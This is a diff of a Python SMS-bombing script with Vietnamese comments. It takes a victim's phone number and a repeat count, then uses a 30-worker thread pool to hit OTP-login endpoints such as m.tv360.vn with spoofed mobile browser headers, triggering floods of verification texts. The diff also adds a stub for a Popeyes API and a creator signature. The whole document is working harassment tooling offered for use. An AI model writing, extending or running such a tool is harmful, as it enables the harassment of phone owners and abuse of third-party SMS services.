@@ -1,16 +1,31 @@
-import requests
-import concurrent.futures
+import sys
 import time
+import json
+from concurrent.futures import ThreadPoolExecutor
+import requests
+
+# Cấu hình lấy thông tin
+threading = ThreadPoolExecutor(max_workers=int(30))
+phone = sys.argv[1]
+amount = int(sys.argv[2])
+
+# Hàm spam API
+def popeyes(sdt):
+    headers = {
+        'Host': 'api.popeyes.vn'
+    }
+    # Tiếp tục viết mã của bạn ở đây
+
 def tv360(phone):
-  data = '{"msisdn":"phone"}'
-  data = data.replace("phone",phone)
-  head = {
-    "Host":"m.tv360.vn",
-    "accept":"application/json, text/plain, */*",
-    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
-    "content-type":"application/json"
-  }
-  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
+    data = '{"msisdn":"phone"}'
+    data = data.replace("phone", phone)
+    head = {
+        "Host": "m.tv360.vn",
+        "accept": "application/json, text/plain, */*",
+        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+        "content-type": "application/json"
+    }
+    rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login", data=data, headers=head).json()
 #
 def robot(phone):
     cookies = {
@@ -1927,7 +1942,7 @@ def run(phone, i):
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print("Usage: python sms.py <phone_number> <count>")
+        print("Usage: python dec.py <phone_number> <count>")
         sys.exit(1)
     
     phone = sys.argv[1]  # Fetch phone number from command-line argument
@@ -1935,3 +1950,5 @@ if __name__ == "__main__":
 
     for i in range(1, count + 1):
         run(phone, i)
+        
+        # Ⓒ Trọng Phúc.EXE
